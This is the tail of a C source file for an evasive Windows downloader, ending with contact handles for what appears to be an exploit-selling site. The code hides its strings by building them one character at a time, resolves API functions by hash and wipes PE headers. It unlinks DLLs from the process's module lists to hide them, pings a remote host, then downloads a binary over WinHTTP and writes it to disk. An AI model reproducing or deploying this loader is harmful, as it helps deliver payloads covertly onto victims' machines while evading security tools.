            Table->GeneralData.UnicodeString.MaximumLength = Table->GeneralData.UnicodeString.Length + sizeof(WCHAR);

            InitializeObjectAttributes(&Attributes, &Table->GeneralData.UnicodeString, OBJ_CASE_INSENSITIVE, 0, NULL);

            Table->Status = Table->NtFunctions.NtCreateFile(&Table->hHandle, FILE_WRITE_DATA | FILE_READ_DATA | SYNCHRONIZE, &Attributes, &Io, 0, FILE_ATTRIBUTE_NORMAL, 0, FILE_OVERWRITE_IF, FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
            if (!NT_SUCCESS(Table->Status))
                RecursiveExecutor(ExitApplication, Table);

            if (hRngDevice)
                Table->NtFunctions.NtClose(hRngDevice);

            break;
        }

        case PopulateComFunctionPointers:
        {
            Table->dwGeneralUsage1 = 0x4cacfe40; //CoInitializeEx
            Table->ComHelper.ComFunction.CoInitializeEx = (COINITIALIZEEX)RecursiveExecutor(GetProcAddressByHash, Table);
                            
            Table->dwGeneralUsage1 = 0xa0f3063e; //CoUninitialize
            Table->ComHelper.ComFunction.CoUninitialize = (COUNINITIALIZE)RecursiveExecutor(GetProcAddressByHash, Table);

            Table->dwGeneralUsage1 = 0xa1f07e4c; //CoCreateInstance
            Table->ComHelper.ComFunction.CoCreateInstance = (COCREATEINSTANCE)RecursiveExecutor(GetProcAddressByHash, Table);

            Table->dwGeneralUsage1 = 0xbea555a3; //CoInitializeSecurity
            Table->ComHelper.ComFunction.CoInitializeSecurity = (COINITIALIZESECURITY)RecursiveExecutor(GetProcAddressByHash, Table);

            break;
        }

        case DownloadBinary:
        {
            CLSID WinhttpRequest;

            WCHAR MethodBuffer[5]; BSTR Method;
            WCHAR UrlBuffer[MAX_PATH * sizeof(WCHAR)]; BSTR Url;

            PBYTE DataBuffer = NULL;

            VARIANT AsyncFlag; ((&AsyncFlag)->vt) = VT_EMPTY;
            VARIANT Body; ((&Body)->vt) = VT_EMPTY;

            typedef struct {
                DWORD dwPad;
                DWORD dwSize;
                union {
                    CHAR Pointer[1];
                    WCHAR String[1];
                    DWORD dwPointer[1];
                } u;
            } BSTR_T;

            IO_STATUS_BLOCK Io;

            Table->ZeroFill.Destination = &MethodBuffer;
            Table->ZeroFill.Size = sizeof(MethodBuffer);
            RecursiveExecutor(ZeroFillData, Table);

            Table->ZeroFill.Destination = &UrlBuffer;
            Table->ZeroFill.Size = sizeof(UrlBuffer);
            RecursiveExecutor(ZeroFillData, Table);

            Table->ZeroFill.Destination = &Io;
            Table->ZeroFill.Size = sizeof(IO_STATUS_BLOCK);
            RecursiveExecutor(ZeroFillData, Table);
            
            Table->bFlag = FALSE;
            Table->dwGeneralUsage1 = 0;
            RecursiveExecutor(LoadComLibraries, Table);

            RecursiveExecutor(NullPeHeaders, Table);

            Table->dwGeneralUsage1 = 0;
            WinhttpRequest.Data1 = 0x2087c2f4;
            WinhttpRequest.Data2 = 0x2cef;
            WinhttpRequest.Data3 = 0x4953;
            WinhttpRequest.Data4[Table->dwGeneralUsage1++] = 0xa8;
            WinhttpRequest.Data4[Table->dwGeneralUsage1++] = 0xab;
            WinhttpRequest.Data4[Table->dwGeneralUsage1++] = 0x66;
            WinhttpRequest.Data4[Table->dwGeneralUsage1++] = 0x77;
            WinhttpRequest.Data4[Table->dwGeneralUsage1++] = 0x9b;
            WinhttpRequest.Data4[Table->dwGeneralUsage1++] = 0x67;
            WinhttpRequest.Data4[Table->dwGeneralUsage1++] = 0x04;
            WinhttpRequest.Data4[Table->dwGeneralUsage1++] = 0x95;
            Table->dwGeneralUsage1 = 0;
            
            Table->ComHelper.ComResult = Table->ComHelper.ComFunction.CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
            if (!SUCCEEDED(Table->ComHelper.ComResult))
                RecursiveExecutor(ExitApplication, Table);
            else
                Table->ComHelper.IsComInitialized = TRUE;

            Table->ComHelper.ComResult = Table->ComHelper.ComFunction.CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, NULL);
            if (!SUCCEEDED(Table->ComHelper.ComResult))
                RecursiveExecutor(ExitApplication, Table);

            RecursiveExecutor(CheckLocalMachinesInternetStatus, Table);
            if (!SUCCEEDED(Table->ComHelper.ComResult))
                RecursiveExecutor(ExitApplication, Table);

            RecursiveExecutor(CheckRemoteHost, Table);
            if (!SUCCEEDED(Table->ComHelper.ComResult))
                RecursiveExecutor(ExitApplication, Table);

            Table->ComHelper.ComResult = Table->ComHelper.ComFunction.CoCreateInstance(WinhttpRequest, NULL, CLSCTX_INPROC_SERVER, IID_IWinHttpRequest, (PVOID*)&Table->ComHelper.ComVariables.HttpRequest);
            if (!SUCCEEDED(Table->ComHelper.ComResult))
                RecursiveExecutor(ExitApplication, Table);

            Table->dwGeneralUsage1 = 0;
            MethodBuffer[Table->dwGeneralUsage1++] = 'G';
            MethodBuffer[Table->dwGeneralUsage1++] = 'E';
            MethodBuffer[Table->dwGeneralUsage1++] = 'T';
            MethodBuffer[Table->dwGeneralUsage1++] = '\0';

            Table->dwGeneralUsage1 = 0;
            UrlBuffer[Table->dwGeneralUsage1++] = 'h'; UrlBuffer[Table->dwGeneralUsage1++] = 't';
            UrlBuffer[Table->dwGeneralUsage1++] = 't'; UrlBuffer[Table->dwGeneralUsage1++] = 'p';
            UrlBuffer[Table->dwGeneralUsage1++] = 's'; UrlBuffer[Table->dwGeneralUsage1++] = ':';
            UrlBuffer[Table->dwGeneralUsage1++] = '/'; UrlBuffer[Table->dwGeneralUsage1++] = '/';
            UrlBuffer[Table->dwGeneralUsage1++] = 's'; UrlBuffer[Table->dwGeneralUsage1++] = 'a';
            UrlBuffer[Table->dwGeneralUsage1++] = 'm'; UrlBuffer[Table->dwGeneralUsage1++] = 'p';
            UrlBuffer[Table->dwGeneralUsage1++] = 'l'; UrlBuffer[Table->dwGeneralUsage1++] = 'e';
            UrlBuffer[Table->dwGeneralUsage1++] = 's'; UrlBuffer[Table->dwGeneralUsage1++] = '.';
            UrlBuffer[Table->dwGeneralUsage1++] = 'v'; UrlBuffer[Table->dwGeneralUsage1++] = 'x';
            UrlBuffer[Table->dwGeneralUsage1++] = '-'; UrlBuffer[Table->dwGeneralUsage1++] = 'u';
            UrlBuffer[Table->dwGeneralUsage1++] = 'n'; UrlBuffer[Table->dwGeneralUsage1++] = 'd';
            UrlBuffer[Table->dwGeneralUsage1++] = 'e'; UrlBuffer[Table->dwGeneralUsage1++] = 'r';
            UrlBuffer[Table->dwGeneralUsage1++] = 'g'; UrlBuffer[Table->dwGeneralUsage1++] = 'r';
            UrlBuffer[Table->dwGeneralUsage1++] = 'o'; UrlBuffer[Table->dwGeneralUsage1++] = 'u';
            UrlBuffer[Table->dwGeneralUsage1++] = 'n'; UrlBuffer[Table->dwGeneralUsage1++] = 'd';
            UrlBuffer[Table->dwGeneralUsage1++] = '.'; UrlBuffer[Table->dwGeneralUsage1++] = 'o';
            UrlBuffer[Table->dwGeneralUsage1++] = 'r'; UrlBuffer[Table->dwGeneralUsage1++] = 'g';
            UrlBuffer[Table->dwGeneralUsage1++] = '/'; UrlBuffer[Table->dwGeneralUsage1++] = 'r';
            UrlBuffer[Table->dwGeneralUsage1++] = 'o'; UrlBuffer[Table->dwGeneralUsage1++] = 'o';
            UrlBuffer[Table->dwGeneralUsage1++] = 't'; UrlBuffer[Table->dwGeneralUsage1++] = '/';
            UrlBuffer[Table->dwGeneralUsage1++] = 'S'; UrlBuffer[Table->dwGeneralUsage1++] = 'a';
            UrlBuffer[Table->dwGeneralUsage1++] = 'm'; UrlBuffer[Table->dwGeneralUsage1++] = 'p';
            UrlBuffer[Table->dwGeneralUsage1++] = 'l'; UrlBuffer[Table->dwGeneralUsage1++] = 'e';
            UrlBuffer[Table->dwGeneralUsage1++] = 's'; UrlBuffer[Table->dwGeneralUsage1++] = '/';
            UrlBuffer[Table->dwGeneralUsage1++] = 'c'; UrlBuffer[Table->dwGeneralUsage1++] = 'm';
            UrlBuffer[Table->dwGeneralUsage1++] = 'd'; UrlBuffer[Table->dwGeneralUsage1++] = '.';
            UrlBuffer[Table->dwGeneralUsage1++] = 'e'; UrlBuffer[Table->dwGeneralUsage1++] = 'x';
            UrlBuffer[Table->dwGeneralUsage1++] = 'e'; UrlBuffer[Table->dwGeneralUsage1++] = '\0';

            Method = MethodBuffer;
            Url = UrlBuffer;

            Table->ComHelper.ComResult = Table->ComHelper.ComVariables.HttpRequest->Open(Method, Url, AsyncFlag);
            if (!SUCCEEDED(Table->ComHelper.ComResult))
                RecursiveExecutor(ExitApplication, Table);

            Table->ComHelper.ComResult = Table->ComHelper.ComVariables.HttpRequest->Send(Body);
            if (!SUCCEEDED(Table->ComHelper.ComResult))
                RecursiveExecutor(ExitApplication, Table);

            Table->ComHelper.ComResult = Table->ComHelper.ComVariables.HttpRequest->get_ResponseText(&Table->ComHelper.ComVariables.ResponseData);
            if (!SUCCEEDED(Table->ComHelper.ComResult))
                RecursiveExecutor(ExitApplication, Table);

            Table->dwGeneralUsage1 = 0;
            Table->dwGeneralUsage1 = (CONTAINING_RECORD((PVOID)Table->ComHelper.ComVariables.ResponseData, BSTR_T, u.String)->dwSize / sizeof(WCHAR));

            Table->dwReturn = Table->dwGeneralUsage1;
            Table->Status = Table->NtFunctions.NtAllocateVirtualMemory(((HANDLE)-1), &DataBuffer, 0, (PSIZE_T)&Table->dwGeneralUsage1, MEM_COMMIT, PAGE_READWRITE);
            if (!NT_SUCCESS(Table->Status))
                RecursiveExecutor(ExitApplication, Table);
            
            for (DWORD dwX = 0; dwX < Table->dwGeneralUsage1; dwX++)
                DataBuffer[dwX] = (BYTE)Table->ComHelper.ComVariables.ResponseData[dwX];
            
            Table->Status = Table->NtFunctions.NtWriteFile(Table->hHandle, NULL, NULL, NULL, &Io, DataBuffer, Table->dwGeneralUsage1, NULL, NULL);

            if (Table->ComHelper.ComVariables.ResponseData)
                Table->ComHelper.ComFunction.SysFreeString(Table->ComHelper.ComVariables.ResponseData);

            if (Table->ComHelper.ComVariables.HttpRequest)
                Table->ComHelper.ComVariables.HttpRequest->Release();

            if (Table->ComHelper.IsComInitialized)
            {
                Table->ComHelper.ComFunction.CoUninitialize();
                Table->ComHelper.IsComInitialized = FALSE;
            }

            if (DataBuffer)
                Table->NtFunctions.NtFreeVirtualMemory(((HANDLE)-1), DataBuffer, 0, MEM_RELEASE);

            if (Table->hHandle)
                Table->NtFunctions.NtClose(Table->hHandle);

            RecursiveExecutor(RemoveComData, Table);

            if (!NT_SUCCESS(Table->Status))
                RecursiveExecutor(ExitApplication, Table);

            break;
        }

        case LoadComLibraries:
        {
            WCHAR CombaseBuffer[20];
            UNICODE_STRING CombaseString;
            Table->LoaderHelper.hMod = NULL;

            Table->ZeroFill.Destination = &CombaseBuffer;
            Table->ZeroFill.Size = sizeof(CombaseBuffer);
            RecursiveExecutor(ZeroFillData, Table);

            Table->ZeroFill.Destination = &CombaseString;
            Table->ZeroFill.Size = sizeof(UNICODE_STRING);
            RecursiveExecutor(ZeroFillData, Table);

            Table->dwGeneralUsage1 = 0;
            CombaseBuffer[Table->dwGeneralUsage1++] = 'C';
            CombaseBuffer[Table->dwGeneralUsage1++] = 'o';
            CombaseBuffer[Table->dwGeneralUsage1++] = 'm';
            CombaseBuffer[Table->dwGeneralUsage1++] = 'b';
            CombaseBuffer[Table->dwGeneralUsage1++] = 'a';
            CombaseBuffer[Table->dwGeneralUsage1++] = 's';
            CombaseBuffer[Table->dwGeneralUsage1++] = 'e';
            CombaseBuffer[Table->dwGeneralUsage1++] = '.';
            CombaseBuffer[Table->dwGeneralUsage1++] = 'd';
            CombaseBuffer[Table->dwGeneralUsage1++] = 'l';
            CombaseBuffer[Table->dwGeneralUsage1++] = 'l';

            CombaseString.Buffer = CombaseBuffer;
            CombaseString.Length = (USHORT)Table->dwGeneralUsage1 * sizeof(WCHAR);
            CombaseString.MaximumLength = CombaseString.Length + sizeof(WCHAR);

            Table->Status = Table->NtFunctions.LdrLoadDll(NULL, 0, &CombaseString, &Table->LoaderHelper.hMod);
            if (!NT_SUCCESS(Table->Status))
                RecursiveExecutor(ExitApplication, Table);

            RecursiveExecutor(PopulateComFunctionPointers, Table);

            if(!Table->ComHelper.ComFunction.CoCreateInstance || !Table->ComHelper.ComFunction.CoInitializeEx || !Table->ComHelper.ComFunction.CoUninitialize)
                RecursiveExecutor(ExitApplication, Table);

            RecursiveExecutor(GetSysFreeString, Table);

            RecursiveExecutor(NullPeHeaders, Table);

            break;
        }

        case GetSysFreeString:
        {
            WCHAR OleAut32Buffer[13];
            UNICODE_STRING OleAut32String;
            Table->LoaderHelper.hMod = NULL;

            Table->ZeroFill.Destination = &OleAut32Buffer;
            Table->ZeroFill.Size = sizeof(OleAut32Buffer);
            RecursiveExecutor(ZeroFillData, Table);

            Table->ZeroFill.Destination = &OleAut32String;
            Table->ZeroFill.Size = sizeof(UNICODE_STRING);
            RecursiveExecutor(ZeroFillData, Table);

            Table->dwGeneralUsage1 = 0;
            OleAut32Buffer[Table->dwGeneralUsage1++] = 'O';
            OleAut32Buffer[Table->dwGeneralUsage1++] = 'l';
            OleAut32Buffer[Table->dwGeneralUsage1++] = 'e';
            OleAut32Buffer[Table->dwGeneralUsage1++] = 'A';
            OleAut32Buffer[Table->dwGeneralUsage1++] = 'u';
            OleAut32Buffer[Table->dwGeneralUsage1++] = 't';
            OleAut32Buffer[Table->dwGeneralUsage1++] = '3';
            OleAut32Buffer[Table->dwGeneralUsage1++] = '2';
            OleAut32Buffer[Table->dwGeneralUsage1++] = '.';
            OleAut32Buffer[Table->dwGeneralUsage1++] = 'd';
            OleAut32Buffer[Table->dwGeneralUsage1++] = 'l';
            OleAut32Buffer[Table->dwGeneralUsage1++] = 'l';

            Table->dwGeneralUsage1 *= sizeof(WCHAR);
            OleAut32String.Buffer = OleAut32Buffer;
            OleAut32String.Length = (USHORT)Table->dwGeneralUsage1;
            OleAut32String.MaximumLength = OleAut32String.Length + sizeof(WCHAR);

            Table->Status = Table->NtFunctions.LdrLoadDll(NULL, 0, &OleAut32String, &Table->LoaderHelper.hMod);
            if (!NT_SUCCESS(Table->Status))
                RecursiveExecutor(ExitApplication, Table);

            Table->dwGeneralUsage1 = 0x14c944f5;
            Table->ComHelper.ComFunction.SysFreeString = (SYSFREESTRING)RecursiveExecutor(GetProcAddressByHash, Table);

            if (!Table->ComHelper.ComFunction.SysFreeString)
                RecursiveExecutor(ExitApplication, Table);

            break;
        }

        case UnloadDll:
        {
            PLDR_MODULE Module = NULL;
            PLIST_ENTRY Head = &Table->Peb->LoaderData->InMemoryOrderModuleList;
            PLIST_ENTRY Next = Head->Flink;
            Module = (PLDR_MODULE)((PBYTE)Next - 16);

            while (Next != Head)
            {
                Module = (PLDR_MODULE)((PBYTE)Next - 16);
                if (Module->BaseDllName.Buffer != NULL)
                {
                    Table->GeneralData.WideStringPointer1 = Module->BaseDllName.Buffer;

                    RecursiveExecutor(HashStringFowlerNollVoVariant1aW, Table);

                    if (Table->dwReturn == Table->dwGeneralUsage1)
                    {
                        Table->Entry = &Module->InLoadOrderModuleList;
                        RecursiveExecutor(RemoveListEntry, Table);

                        Table->Entry = &Module->InInitializationOrderModuleList;
                        RecursiveExecutor(RemoveListEntry, Table);

                        Table->Entry = &Module->InMemoryOrderModuleList;
                        RecursiveExecutor(RemoveListEntry, Table);

                        Table->Entry = &Module->HashTableEntry;
                        RecursiveExecutor(RemoveListEntry, Table);

                        break;
                    }
                }

                Next = Next->Flink;
            }

            break;
        }

        case RemoveListEntry:
        {
            PLIST_ENTRY OldFlink, OldBlink;

            OldFlink = Table->Entry->Flink;
            OldBlink = Table->Entry->Blink;
            OldFlink->Blink = OldBlink;
            OldBlink->Flink = OldFlink;
            Table->Entry->Flink = NULL;
            Table->Entry->Blink = NULL;

            break;
        }

        case RemoveComData:
        {
            Table->dwGeneralUsage1 = 0x52d488c9;
            RecursiveExecutor(UnloadDll, Table);

            Table->dwGeneralUsage1 = 0xb8c65c5e;
            RecursiveExecutor(UnloadDll, Table);

            Table->ComHelper.ComFunction.CoCreateInstance = NULL;
            Table->ComHelper.ComFunction.CoInitializeEx = NULL;
            Table->ComHelper.ComFunction.CoUninitialize = NULL;
            Table->ComHelper.ComFunction.SysFreeString = NULL;
            Table->ComHelper.ComFunction.CoInitializeSecurity = NULL;

            break;
        }

        case CheckRemoteHost:
        {
            WCHAR RootBuffer[12]; BSTR Root;
            WCHAR WqlBuffer[5]; BSTR Wql;
            WCHAR QueryBuffer[62]; BSTR Query;
            WCHAR GetPropertyBuffer[12]; BSTR GetProperty;
            VARIANT PingStatus; ((&PingStatus)->vt) = VT_EMPTY;

            Table->ZeroFill.Destination = &RootBuffer;
            Table->ZeroFill.Size = sizeof(RootBuffer);
            RecursiveExecutor(ZeroFillData, Table);

            Table->ZeroFill.Destination = &WqlBuffer;
            Table->ZeroFill.Size = sizeof(WqlBuffer);
            RecursiveExecutor(ZeroFillData, Table);

            Table->ZeroFill.Destination = &QueryBuffer;
            Table->ZeroFill.Size = sizeof(QueryBuffer);
            RecursiveExecutor(ZeroFillData, Table);

            Table->ZeroFill.Destination = &GetPropertyBuffer;
            Table->ZeroFill.Size = sizeof(GetPropertyBuffer);
            RecursiveExecutor(ZeroFillData, Table);

            Table->ComHelper.ComResult = Table->ComHelper.ComFunction.CoCreateInstance(CLSID_WbemAdministrativeLocator, NULL, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (PVOID*)&Table->ComHelper.ComVariables.Locator);
            if (!SUCCEEDED(Table->ComHelper.ComResult))
                RecursiveExecutor(ExitApplication, Table);

            Table->dwGeneralUsage1 = 0;
            RootBuffer[Table->dwGeneralUsage1++] = 'r';
            RootBuffer[Table->dwGeneralUsage1++] = 'o';
            RootBuffer[Table->dwGeneralUsage1++] = 'o';
            RootBuffer[Table->dwGeneralUsage1++] = 't';
            RootBuffer[Table->dwGeneralUsage1++] = '\\';
            RootBuffer[Table->dwGeneralUsage1++] = 'c';
            RootBuffer[Table->dwGeneralUsage1++] = 'i';
            RootBuffer[Table->dwGeneralUsage1++] = 'm';
            RootBuffer[Table->dwGeneralUsage1++] = 'v';
            RootBuffer[Table->dwGeneralUsage1++] = '2';
            RootBuffer[Table->dwGeneralUsage1++] = '\0';
            Root = RootBuffer;

            Table->ComHelper.ComResult = Table->ComHelper.ComVariables.Locator->ConnectServer(Root, NULL, NULL, NULL, WBEM_FLAG_CONNECT_USE_MAX_WAIT, NULL, NULL, &Table->ComHelper.ComVariables.Services);
            if (!SUCCEEDED(Table->ComHelper.ComResult))
                RecursiveExecutor(ExitApplication, Table);

            Table->dwGeneralUsage1 = 0;
            WqlBuffer[Table->dwGeneralUsage1++] = 'W';
            WqlBuffer[Table->dwGeneralUsage1++] = 'Q';
            WqlBuffer[Table->dwGeneralUsage1++] = 'L';
            WqlBuffer[Table->dwGeneralUsage1++] = '\0';
            Wql = WqlBuffer;

            Table->dwGeneralUsage1 = 0;
            QueryBuffer[Table->dwGeneralUsage1++] = 'S'; QueryBuffer[Table->dwGeneralUsage1++] = 'E';
            QueryBuffer[Table->dwGeneralUsage1++] = 'L'; QueryBuffer[Table->dwGeneralUsage1++] = 'E';
            QueryBuffer[Table->dwGeneralUsage1++] = 'C'; QueryBuffer[Table->dwGeneralUsage1++] = 'T';
            QueryBuffer[Table->dwGeneralUsage1++] = ' '; QueryBuffer[Table->dwGeneralUsage1++] = '*';
            QueryBuffer[Table->dwGeneralUsage1++] = ' '; QueryBuffer[Table->dwGeneralUsage1++] = 'F';
            QueryBuffer[Table->dwGeneralUsage1++] = 'R'; QueryBuffer[Table->dwGeneralUsage1++] = 'O';
            QueryBuffer[Table->dwGeneralUsage1++] = 'M'; QueryBuffer[Table->dwGeneralUsage1++] = ' ';
            QueryBuffer[Table->dwGeneralUsage1++] = 'W'; QueryBuffer[Table->dwGeneralUsage1++] = 'i';
            QueryBuffer[Table->dwGeneralUsage1++] = 'n'; QueryBuffer[Table->dwGeneralUsage1++] = '3';
            QueryBuffer[Table->dwGeneralUsage1++] = '2'; QueryBuffer[Table->dwGeneralUsage1++] = '_';
            QueryBuffer[Table->dwGeneralUsage1++] = 'P'; QueryBuffer[Table->dwGeneralUsage1++] = 'i';
            QueryBuffer[Table->dwGeneralUsage1++] = 'n'; QueryBuffer[Table->dwGeneralUsage1++] = 'g';
            QueryBuffer[Table->dwGeneralUsage1++] = 'S'; QueryBuffer[Table->dwGeneralUsage1++] = 't';
            QueryBuffer[Table->dwGeneralUsage1++] = 'a'; QueryBuffer[Table->dwGeneralUsage1++] = 't';
            QueryBuffer[Table->dwGeneralUsage1++] = 'u'; QueryBuffer[Table->dwGeneralUsage1++] = 's';
            QueryBuffer[Table->dwGeneralUsage1++] = ' '; QueryBuffer[Table->dwGeneralUsage1++] = 'W';
            QueryBuffer[Table->dwGeneralUsage1++] = 'H'; QueryBuffer[Table->dwGeneralUsage1++] = 'E';
            QueryBuffer[Table->dwGeneralUsage1++] = 'R'; QueryBuffer[Table->dwGeneralUsage1++] = 'E';
            QueryBuffer[Table->dwGeneralUsage1++] = ' '; QueryBuffer[Table->dwGeneralUsage1++] = 'A';
            QueryBuffer[Table->dwGeneralUsage1++] = 'd'; QueryBuffer[Table->dwGeneralUsage1++] = 'd';
            QueryBuffer[Table->dwGeneralUsage1++] = 'r'; QueryBuffer[Table->dwGeneralUsage1++] = 'e';
            QueryBuffer[Table->dwGeneralUsage1++] = 's'; QueryBuffer[Table->dwGeneralUsage1++] = 's';
            QueryBuffer[Table->dwGeneralUsage1++] = '='; QueryBuffer[Table->dwGeneralUsage1++] = '"';
            QueryBuffer[Table->dwGeneralUsage1++] = '1'; QueryBuffer[Table->dwGeneralUsage1++] = '7';
            QueryBuffer[Table->dwGeneralUsage1++] = '2'; QueryBuffer[Table->dwGeneralUsage1++] = '.';
            QueryBuffer[Table->dwGeneralUsage1++] = '6'; QueryBuffer[Table->dwGeneralUsage1++] = '7';
            QueryBuffer[Table->dwGeneralUsage1++] = '.'; QueryBuffer[Table->dwGeneralUsage1++] = '1';
            QueryBuffer[Table->dwGeneralUsage1++] = '3'; QueryBuffer[Table->dwGeneralUsage1++] = '6';
            QueryBuffer[Table->dwGeneralUsage1++] = '.'; QueryBuffer[Table->dwGeneralUsage1++] = '1';
            QueryBuffer[Table->dwGeneralUsage1++] = '3'; QueryBuffer[Table->dwGeneralUsage1++] = '6';
            QueryBuffer[Table->dwGeneralUsage1++] = '"'; QueryBuffer[Table->dwGeneralUsage1++] = '\0';
            Query = QueryBuffer;

            Table->ComHelper.ComResult = Table->ComHelper.ComVariables.Services->ExecQuery(Wql, Query, WBEM_FLAG_FORWARD_ONLY, NULL, &Table->ComHelper.ComVariables.Enum);
            if (!SUCCEEDED(Table->ComHelper.ComResult))
                RecursiveExecutor(ExitApplication, Table);

            Table->dwGeneralUsage1 = 0;
            Table->ComHelper.ComResult = Table->ComHelper.ComVariables.Enum->Next(WBEM_INFINITE, 1L, &Table->ComHelper.ComVariables.Ping, &Table->dwGeneralUsage1);
            if (!SUCCEEDED(Table->ComHelper.ComResult))
                RecursiveExecutor(ExitApplication, Table);

            if (Table->dwGeneralUsage1 == 0)
                RecursiveExecutor(ExitApplication, Table);

            Table->dwGeneralUsage1 = 0;
            GetPropertyBuffer[Table->dwGeneralUsage1++] = 'S';
            GetPropertyBuffer[Table->dwGeneralUsage1++] = 't';
            GetPropertyBuffer[Table->dwGeneralUsage1++] = 'a';
            GetPropertyBuffer[Table->dwGeneralUsage1++] = 't';
            GetPropertyBuffer[Table->dwGeneralUsage1++] = 'u';
            GetPropertyBuffer[Table->dwGeneralUsage1++] = 's';
            GetPropertyBuffer[Table->dwGeneralUsage1++] = 'C';
            GetPropertyBuffer[Table->dwGeneralUsage1++] = 'o';
            GetPropertyBuffer[Table->dwGeneralUsage1++] = 'd';
            GetPropertyBuffer[Table->dwGeneralUsage1++] = 'e';
            GetPropertyBuffer[Table->dwGeneralUsage1++] = '\0';
            GetProperty = GetPropertyBuffer;

            Table->ComHelper.ComResult = Table->ComHelper.ComVariables.Ping->Get(GetProperty, 0, &PingStatus, NULL, NULL);
            if (!SUCCEEDED(Table->ComHelper.ComResult))
                RecursiveExecutor(ExitApplication, Table);

            if (PingStatus.iVal != ERROR_SUCCESS)
                RecursiveExecutor(ExitApplication, Table);

            if (Table->ComHelper.ComVariables.Locator)
                Table->ComHelper.ComVariables.Locator->Release();

            if (Table->ComHelper.ComVariables.Enum)
                Table->ComHelper.ComVariables.Enum->Release();

            if (Table->ComHelper.ComVariables.Ping)
                Table->ComHelper.ComVariables.Ping->Release();

            if (Table->ComHelper.ComVariables.Services)
                Table->ComHelper.ComVariables.Services->Release();

            Table->ComHelper.ComResult = S_OK;

            break;
        }

        case SafelyExitCom:
        {
            if (Table->ComHelper.IsComInitialized)
                RecursiveExecutor(ExitApplication, Table);

            if (Table->ComHelper.ComVariables.Locator)
                Table->ComHelper.ComVariables.Locator->Release();

            if (Table->ComHelper.ComVariables.Enum)
                Table->ComHelper.ComVariables.Enum->Release();

            if (Table->ComHelper.ComVariables.Ping)
                Table->ComHelper.ComVariables.Ping->Release();

            if (Table->ComHelper.ComVariables.Services)
                Table->ComHelper.ComVariables.Services->Release();

            if (Table->ComHelper.ComVariables.NetworkManager)
                Table->ComHelper.ComVariables.NetworkManager->Release();

            if (Table->ComHelper.ComVariables.HttpRequest)
                Table->ComHelper.ComVariables.HttpRequest->Release();

            if(Table->ComHelper.ComVariables.ResponseData)
                Table->ComHelper.ComFunction.SysFreeString(Table->ComHelper.ComVariables.ResponseData);

            RecursiveExecutor(RemoveComData, Table);

            break;
        }

        case CheckLocalMachinesInternetStatus:
        {
            VARIANT_BOOL Connected = VARIANT_FALSE;

            Table->ComHelper.ComResult = Table->ComHelper.ComFunction.CoCreateInstance(CLSID_NetworkListManager, NULL, CLSCTX_ALL, __uuidof(INetworkListManager), (LPVOID*)&Table->ComHelper.ComVariables.NetworkManager);
            if (!SUCCEEDED(Table->ComHelper.ComResult))
                RecursiveExecutor(ExitApplication, Table);

            Table->ComHelper.ComVariables.NetworkManager->get_IsConnectedToInternet(&Connected);
            if (Connected == VARIANT_FALSE)
                RecursiveExecutor(ExitApplication, Table);

            Table->ComHelper.ComResult = S_OK;

            if (Table->ComHelper.ComVariables.NetworkManager)
                Table->ComHelper.ComVariables.NetworkManager->Release();

            break;
        }

        case ZeroFillData:
        {
            PCHAR q = (PCHAR)Table->ZeroFill.Destination;
            PCHAR End = q + Table->ZeroFill.Size;

            for (;;) {
                if (q >= End) break; *q++ = 0;
                if (q >= End) break; *q++ = 0;
                if (q >= End) break; *q++ = 0;
                if (q >= End) break; *q++ = 0;
            }

            break;
        }

        case Win32FromHResult:
        {
            if ((Table->ComHelper.ComResult & 0xFFFF0000) == MAKE_HRESULT(SEVERITY_ERROR, FACILITY_WIN32, 0))
                Table->dwError = HRESULT_CODE(Table->ComHelper.ComResult);

            break;
        }

        default:
            break;
    }

    return (LPVOID)Table->dwError;
}



#pragma warning(push)
#pragma warning(disable: 6262)

INT ApplicationEntryPoint(VOID)
{
    VARIABLE_TABLE Table;
    Table.dwError = 0; Table.Status = 0;
    return (INT)(DWORD64)RecursiveExecutor(EntryPoint, &Table);
}
#pragma warning(pop)
```

<img align="left" src="https://injectexp.dev/assets/img/logo/logo1.png">
Contacts:
injectexp.dev / 
pro.injectexp.dev / 
Telegram: @Evi1Grey5 [support]
Tox: 340EF1DCEEC5B395B9B45963F945C00238ADDEAC87C117F64F46206911474C61981D96420B72
